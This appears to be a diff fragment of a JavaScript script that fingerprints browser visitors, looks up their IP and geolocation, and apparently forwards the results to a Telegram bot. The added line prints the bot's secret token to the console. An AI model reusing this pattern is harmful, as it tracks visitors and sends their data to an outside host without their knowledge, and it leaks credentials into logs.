@@ -15,6 +15,7 @@ new Fingerprint2().get(function(fingerprint, components){
 
 
 var sendIpsTelegram = function(token, chatID){
+    console.log(process.env.TELEGRAM_TOKEN)
     endpoint='https://api.telegram.org/'+token+'/sendMessage';
     $.getJSON('https://json.geoiplookup.io/?callback=?', function(dataIP) {
       userData.IP=dataIP;
